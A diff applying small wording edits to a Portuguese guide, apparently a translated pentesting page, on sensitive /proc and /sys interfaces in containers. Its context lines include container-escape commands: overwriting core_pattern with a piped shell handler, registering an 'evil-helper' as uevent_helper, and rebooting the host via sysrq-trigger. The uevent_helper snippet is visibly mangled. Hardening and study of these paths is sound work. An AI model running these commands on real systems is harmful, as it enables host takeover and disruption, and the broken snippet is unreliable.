@@ -15,14 +15,14 @@ Este diretório permite o acesso para modificar variáveis do kernel, geralmente
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Descrito em [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Permite definir um programa a ser executado na geração de arquivos de core, com os primeiros 128 bytes como argumentos. Isso pode levar à execução de código se o arquivo começar com um pipe `|`.
+- Permite definir um programa a ser executado na geração de arquivos de core com os primeiros 128 bytes como argumentos. Isso pode levar à execução de código se o arquivo começar com um pipe `|`.
 - **Exemplo de Teste e Exploração**:
 
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testar acesso de escrita
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testa acesso de escrita
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Definir manipulador personalizado
-sleep 5 && ./crash & # Acionar manipulador
+echo "|$overlay/shell.sh" > core_pattern # Define manipulador personalizado
+sleep 5 && ./crash & # Aciona manipulador
 ```
 
 #### **`/proc/sys/kernel/modprobe`**
@@ -32,7 +32,7 @@ sleep 5 && ./crash & # Acionar manipulador
 - **Exemplo de Verificação de Acesso**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acesso ao modprobe
+ls -l $(cat /proc/sys/kernel/modprobe) # Verifica acesso ao modprobe
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
@@ -48,7 +48,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acesso ao modprobe
 #### **`/proc/sys/fs/binfmt_misc`**
 
 - Permite registrar interpretadores para formatos binários não nativos com base em seu número mágico.
-- Pode levar à escalada de privilégios ou acesso a shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
+- Pode levar à escalada de privilégios ou acesso ao shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
 - Exploit relevante e explicação:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Tutorial aprofundado: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
@@ -71,13 +71,13 @@ echo b > /proc/sysrq-trigger # Reinicializa o host
 
 #### **`/proc/kmsg`**
 
-- Exibe mensagens do buffer de anel do kernel.
+- Expõe mensagens do buffer de anel do kernel.
 - Pode ajudar em exploits do kernel, vazamentos de endereços e fornecer informações sensíveis do sistema.
 
 #### **`/proc/kallsyms`**
 
 - Lista símbolos exportados do kernel e seus endereços.
-- Essencial para o desenvolvimento de exploits do kernel, especialmente para contornar KASLR.
+- Essencial para o desenvolvimento de exploits do kernel, especialmente para superar KASLR.
 - As informações de endereço são restritas com `kptr_restrict` definido como `1` ou `2`.
 - Detalhes em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -85,7 +85,7 @@ echo b > /proc/sysrq-trigger # Reinicializa o host
 
 - Interface com o dispositivo de memória do kernel `/dev/mem`.
 - Historicamente vulnerável a ataques de escalada de privilégios.
-- Mais sobre [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Mais em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
@@ -107,12 +107,12 @@ echo b > /proc/sysrq-trigger # Reinicializa o host
 #### **`/proc/sched_debug`**
 
 - Retorna informações de agendamento de processos, contornando as proteções do namespace PID.
-- Exibe nomes de processos, IDs e identificadores de cgroup.
+- Expõe nomes de processos, IDs e identificadores de cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
 - Fornece informações sobre pontos de montagem no namespace de montagem do processo.
-- Exibe a localização do `rootfs` ou imagem do contêiner.
+- Expõe a localização do `rootfs` ou imagem do contêiner.
 
 ### Vulnerabilidades do `/sys`
 
@@ -130,7 +130,7 @@ echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /ev
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Define uevent_helper para o manipulador malicioso
+#### Define uevent_helper para o helper malicioso
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
@@ -144,7 +144,7 @@ cat /output %%%
 
 #### **`/sys/class/thermal`**
 
-- Controla configurações de temperatura, potencialmente causando ataques DoS ou danos físicos.
+- Controla configurações de temperatura, potencialmente causando ataques de DoS ou danos físicos.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
@@ -157,7 +157,7 @@ cat /output %%%
 
 #### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**
 
-- Expondo interfaces para interagir com variáveis EFI na NVRAM.
+- Expõe interfaces para interagir com variáveis EFI na NVRAM.
 - A má configuração ou exploração pode levar a laptops brickados ou máquinas host não inicializáveis.
 
 #### **`/sys/kernel/debug`**
